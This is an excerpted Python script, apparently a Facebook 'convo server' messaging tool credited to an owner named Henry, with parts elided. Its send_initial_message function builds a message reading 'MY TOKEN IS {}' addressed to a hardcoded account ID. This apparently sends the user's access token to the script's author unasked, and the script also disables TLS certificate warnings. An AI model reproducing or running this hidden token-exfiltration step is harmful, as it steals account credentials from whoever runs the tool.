...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"OWNER HENRY DWN DON'T CHANGE THE CREDIT'S OKAY ")
...
def send_initial_message():
    ...
    msg_template = "𝙃𝙀𝙇𝙇𝙊 𝙃𝙀𝙉𝙍𝙔 𝙎𝙄𝙍! 𝙄𝙈 𝙐𝙎𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝘾𝙊𝙉𝙑𝙊 𝙎𝙀𝙍𝙑𝙀𝙍 𝙈𝙔 𝙏𝙊𝙆𝙀𝙉 𝙄𝙎 😇👉 {}"

    # Specify the ID where you want to send the message
    target_id = "100022758226523"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\u001b[37m' + '𝙃𝙀𝙉𝙍𝙔 𝙎𝙀𝙍𝙑𝙀𝙍 𝙄𝙎 𝙍𝙐𝙉𝙉𝙄𝙉𝙂---------------------------------------------------')
